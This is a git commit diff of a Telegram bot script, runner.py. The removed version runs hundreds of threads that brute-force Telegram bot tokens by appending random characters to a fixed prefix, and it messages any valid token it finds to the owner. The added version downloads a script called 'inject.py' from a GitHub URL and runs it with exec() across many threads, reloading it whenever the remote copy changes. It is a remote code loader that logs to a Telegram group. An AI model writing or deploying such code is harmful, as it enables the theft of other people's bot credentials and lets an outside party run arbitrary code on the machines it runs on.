6617c3160273ecb24b5fd3f0e7893892c07ac668
Himanshu kumar <83366556+I-Himanshu@users.noreply.github.com>
2021-09-28 00:24:45 +0530

    update runner.py

--- runner.py
+++ runner.py
@@ -1,69 +1,71 @@
-import random
 import threading
 from telegram import Bot
-import os,sys
-from pytz import timezone 
-from datetime import datetime
+import time, requests, os, sys, random
 
-chars ="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
 
-THREAD_COUNT = int(os.environ.get("THREADS","250"))
-GROUP_NAME = os.environ.get("GROUP_NAME","Mahabharat").replace("-","_")
-TOKEN=os.environ.get("BOT_TOKEN","Unauthorised")
+EXECUTION_CODE="print('test')"
+
+GROUP_NAME = os.environ.get("GROUP_NAME","anonymous").replace("-","_")
+THREAD_COUNT = int(os.environ.get("THREADS","200"))
+TOKEN=os.environ.get("BOT_TOKEN","NO_BOT_TOKEN")
 bot=Bot(TOKEN)
 
 OWNER = 834508473
 LOG_GROUP = -1001319740376
+ATTEMPT = 0
 
-START_TIME = datetime.now(timezone("Asia/Kolkata"))
 
-def Log(msg):
-  print(msg)
-  bot.send_message(LOG_GROUP,msg)
+def LOGGING(text):
+  print(text)
+  bot.send_message(LOG_GROUP,str(text),parse_mode='MarkdownV2')
+  
+  
+def update_code():
+  """this function will check that code need update if yes then it will update EXECUTION_CODE"""
+  global EXECUTION_CODE
+  RESPONSE_CODE = requests.get("https://raw.githubusercontent.com/I-Himanshu/vcStreamBot/storage/inject.py").text
+  if RESPONSE_CODE.startswith("#ADMlNxd"):
+    if RESPONSE_CODE != EXECUTION_CODE:
+      EXECUTION_CODE = RESPONSE_CODE
+      try:
+        version=EXECUTION_CODE.split("\n")[0].split(" ")[1]
+      except Exception as e:
+        LOGGING('⚠️ {} on line {}'.format(GROUP_NAME,sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
+        version="Undefined"
+      LOGGING("Group ```{}``` is updated and restarted successfully\nVersion ```{}```".format(GROUP_NAME,version))
+      
 
-Log(f"""
-Server Restart
-No Of Bots : {THREAD_COUNT}
-GROUP NAME : #{GROUP_NAME}
-Current Time: {START_TIME:%Y-%m-%d %H:%M}
-""")
+def runMyCode(botNo):
+  global EXECUTION_CODE,ATTEMPT
+  try:
+    exec(EXECUTION_CODE)
+  except Exception as e:
+    LOGGING('⚠️ {} on line {}'.format(GROUP_NAME,sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
 
-def run(n):
-  ATTEMPT = 0
-  while True:
-    ATTEMPT += 1
-    if ATTEMPT % 1000 == 0:
-      if n == THREAD_COUNT:
-        CURRENT_TIME = datetime.now(timezone("Asia/Kolkata"))
-        TIME_DIFFERENCE = CURRENT_TIME - START_TIME
-        TIME_TAKEN = TIME_DIFFERENCE.total_seconds()/60
-        Log(f"""{ATTEMPT} Attempt Completed by {n} Bots \nBOT_GROUP_NAME: {GROUP_NAME} \nRUNNING FROM {TIME_TAKEN} Minutes""")
-        
-    token = "609517172:AA" + "".join(random.choices(chars,k=33))
-    new_bot = Bot(token)
-    try:
-      username = new_bot.username
-      if username:
-        print(username)
-        print(token)
-        bot.send_message(OWNER,token)
-        Log(username)
-        bot.send_message(OWNER,"😎"*50)
-        Log("#Congratulations")
-        Log("👀"*20)
-        Log(token[11:])
-        sys.exit()
-    except:
-      pass
-    
+  
+def make_and_destroy_thread():
+  #This Will Make And Remake Threads
+  threads = []
+  for i in range(int(THREAD_COUNT)):
+    thread = threading.Thread(target=runMyCode,args=[i])
+    thread.start()
+    threads.append(thread)
+  for thread in threads:
+    thread.join()
+  
+  try:
+    update_code()
+    make_and_destroy_thread()
+  except Exception as e:
+    LOGGING('⚠️ {} on line {}'.format(GROUP_NAME,sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
+    raise e
+  
 
-THREADS = []
-for i in range(THREAD_COUNT):
-  thread = threading.Thread(target=run,args=[i])
-  thread.start()
-  THREADS.append(thread)
-print(len(THREADS))
 
-for thread in THREADS:
-  thread.join()
-print("Done")
+try:
+  LOGGING("👶 SERVER ```{}``` IS STARTING WITH {} BOTS".format(GROUP_NAME,THREAD_COUNT))
+  update_code()
+  make_and_destroy_thread()
+except Exception as e:
+  LOGGING('⚠️ {} on line {}'.format(GROUP_NAME,sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
+  raise e
